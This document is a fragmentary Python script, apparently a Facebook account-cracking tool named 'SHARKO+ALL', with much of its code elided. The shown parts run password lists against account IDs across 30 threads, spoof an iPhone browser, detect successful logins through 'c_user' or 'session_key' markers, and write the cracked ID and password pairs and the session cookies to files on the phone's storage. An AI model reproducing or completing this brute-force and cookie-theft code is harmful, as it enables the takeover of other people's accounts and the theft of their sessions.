...
AUTHER    : SHARKO XWD
OWNER ❤️: SHARKO XWD
Facebook : IDK MAYBE SHARKO XWD
Tool Name: SHARKO+ALL
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        linex()
                                        print("\033[1;32m OK IDZ SAVED IN >>>>> /SDCARD/WOW-SHARKO.TXT")
                                        print("\033[1;32m CP IDZ SAVED IN >>>>> /SDCARD/MAMBA-CP.TXT")
                                        print("\033[1;32m COOKIE SAVED IN >>>> /SDCARD/SHARKO-EATTXT")
                                        linex()
...
def ffb(ids,names,passlist):
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in MAMBA:
                                print('\r\r\033[1;32m [WOW-SHARKO] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                print("Cookie: "+coki)
                                open('/sdcard/SHARKO-EATtxt','a').write(coki+'\n')
                                open('/sdcard/WOW-SHARKO.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                ...
                try:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [WOW-SHARKO] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/WOW-SHARKO.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [WOW-SHARKO] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/SHARKO-EATtxt','a').write(coki+'\n')
                                        open('/sdcard/WOW-SHARKO.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
